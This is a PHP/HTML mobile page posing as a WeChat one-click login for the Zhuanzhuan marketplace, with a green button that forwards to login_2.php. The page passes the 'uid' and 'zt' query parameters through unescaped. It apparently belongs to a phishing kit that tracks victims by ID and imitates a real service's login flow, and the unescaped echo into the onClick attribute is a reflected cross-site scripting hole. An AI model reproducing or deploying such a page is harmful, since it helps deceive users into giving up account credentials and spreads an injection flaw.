<?php
$uid=$_GET['uid'];
$zt=$_GET['zt'];
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>微信登录</title>
<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon"/>
<meta content="yes" name="apple-mobile-web-app-capable">
<meta content="black" name="apple-mobile-web-app-status-bar-style">
<meta name="format-detection" content="telephone=no">
<link type="text/css" rel="styleSheet" href="./js/datail.css">
<meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
<meta name="aplus-waiting" content="1">
<meta name="data-spm" content="a1z3i">
<link rel="stylesheet" href="./js/mo.css">
<style type="text/css"></style></head>
<body>
<header class="head1">
<span class="icon-left" onClick="window.history.go(-1)"></span>
<h1>登录</h1>
</header>
<div class="clear"></div>
<div style="margin-top:40px; margin-bottom:10px; background:#fff; font-weight:bold">
    <div style="margin-top:50px; text-align:center; line-height:30px; font-size:14px">
        账号太多记不住？<br />
        微信一键登录，更安全，更方便<br /><br />
        <img src="./imges/mipush_notification.png" width="70" />
        
        <div class="submit" style="margin-top:90px">
            <button type="submit"  class="button" id="submit-btn" style="background:#00be00; border:none; height:35px; line-height:35px; font-size:14px; " onClick="location.href='<?php echo"login_2.php?uid=$uid&zt=$zt"; ?>';">微信登录</button>
        </div>
        <div style=" text-align:left; padding:8px 10px 0px 10px">
            <span style="color:#ccc">阅读并接受</span>《转转使用条约与规范》
        </div>
    </div>
    
</div>
</body></html>